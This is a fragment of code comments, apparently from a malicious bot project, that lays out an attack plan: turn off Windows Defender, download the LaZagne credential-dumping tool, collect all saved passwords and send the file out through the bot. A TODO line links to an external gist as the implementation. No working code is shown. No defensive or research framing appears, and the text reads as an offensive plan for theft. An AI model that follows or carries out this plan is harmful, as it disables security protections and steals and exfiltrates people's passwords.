...
# scenario : turn off defender then download lazagne finally save all passwords and send the file through the bot
# 


# TODO :
# use https://gist.github.com/wildonion/cc711a5bc743667b00318a713e396b48 to implement above scenario
